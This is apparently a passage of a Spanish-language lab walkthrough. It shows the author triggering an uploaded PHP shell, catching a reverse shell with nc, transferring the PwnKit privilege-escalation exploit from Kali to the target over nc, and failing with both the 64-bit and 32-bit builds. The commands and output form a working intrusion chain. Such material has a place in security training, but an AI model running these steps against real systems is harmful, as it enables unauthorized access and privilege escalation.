### Hago el get después cargar el shell.PHp mediante el panel de admin
```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ curl http://10.0.2.8/admin/uploads/shell.PHp
```

Mientras escucho por el puerto 4444 con nc:

```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.5] from (UNKNOWN) [10.0.2.8] 34344
Linux debian 2.6.32-5-686 #1 SMP Sun May 6 04:01:19 UTC 2012 i686 GNU/Linux
 19:18:45 up  1:24,  6 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty1                      17:54    1:23m  0.11s  0.08s -bash
user     tty2                      17:54    1:24m  0.01s  0.01s -bash
user     tty5                      17:54    1:24m  0.00s  0.00s -bash
user     tty4                      17:54    1:24m  0.00s  0.00s -bash
user     tty6                      17:54    1:24m  0.00s  0.00s -bash
user     tty3                      17:54    1:24m  0.00s  0.00s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$
```
### En el servidor (a través de tu reverse shell existente)

Primero, en tu shell reverse actual, preparas el servidor para recibir el archivo. Esto implica usar `nc` para escuchar en un puerto específico y redirigir la salida a un archivo. Si no tienes `nc` disponible en el servidor, podrías usar `python` o cualquier otro método que permita recibir datos sobre TCP. Asegúrate de elegir un puerto que no esté siendo usado (`12345` en tu ejemplo parece estar bien, siempre y cuando no esté ya en uso).

Si nc está disponible, podrías hacer algo como esto en el servidor:

```bash
$ nc -lvnp 12345 > /tmp/PwnKit2
listening on [any] 12345 ...
```

Esto hará que `nc` escuche en el puerto `12345` y escriba todo lo que reciba en el archivo `/tmp/PwnKit2`

-----------------------------------------------------------------
### En la máquina Kali
Me descargo el archivo PwnKit
```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ ls
kill_get.sh  kill.sh  PwnKit  shell.PHp

┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ chmod +x PwnKit                                                               
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ ls -l PwnKit 
-rwxr-xr-x 1 kali kali 18040 Mar 21 17:10 PwnKit
```
Mediante `nc` envió el contenido del fichero descargado.
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ nc 10.0.2.8 12345 < /home/kali/Desktop/shel_sql/PwnKit  

En el lado del servidor compruebo:

Conexión realizada:
```bash
$ nc -lvnp 12345 > /tmp/PwnKit
listening on [any] 12345 ...
connect to [10.0.2.8] from (UNKNOWN) [10.0.2.5] 36654
```

Cuando intentaba lanzar el binario me da este error:
```bash
$ /tmp/PwnKit
/tmp/PwnKit: 1: Syntax error: ")" unexpected
```
Porque el binario era de 64 bits:
```bash
$ file /tmp/PwnKit
/tmp/PwnKit: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), not stripped
```

Ahora me descargo el binario de 32 bits:
```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit32 -o PwnKit32

┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ file PwnKit32
PwnKit32: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c1da47dfa92fe574f5f18fe7014b31a692a0a5f, with debug_info, not stripped
```

No funciona.
